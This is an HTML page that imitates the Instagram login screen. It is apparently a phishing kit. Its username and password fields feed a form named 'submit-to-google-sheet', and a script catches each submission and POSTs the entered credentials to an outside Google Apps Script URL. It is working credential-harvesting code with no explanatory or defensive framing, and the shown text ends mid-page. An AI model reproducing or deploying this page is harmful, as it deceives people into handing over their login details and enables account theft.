<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Instagram Login Page</title>

        <style>
.button {
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 15px;
  margin: 4px 2px;
  cursor: pointer;
}

.button {padding: 4px 62px;}
.button {background-color: #008CBA;} /* Blue */
</style>

</head>
<body>

<div class="wrapper">
	<div class="header">
		<div class="top">
			<div class="logo">
				<img src="instagram.png" alt="instagram" style="width: 175px;">
			</div>
			<form name="submit-to-google-sheet">
                                 
				<div class="input_field">
                                        <div style="text-align:center">
					<input type="text" name="email" placeholder="username" class="input" width="48" heignt="48">
                                        </div>
				</div>
				<div class="input_field">
                                        <div style="text-align:center">
					<input type="password" name="password" placeholder="Password" class="input" width="48" heignt="48">
                                        </div>
				</div>
                                <div style="text-align:center"> 
				<button type="submit" class="button">Login</button>
                                </div>
                        </form>
 <script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycbz75ZR0Tk9ueIqWDNu6chZuFdGuWEipyQRXUZpbkDUVAGFkV08/exec'
  const form = document.forms['submit-to-google-sheet']

  form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message))
  })
</script>
			</div>

				<div class="line"></div>
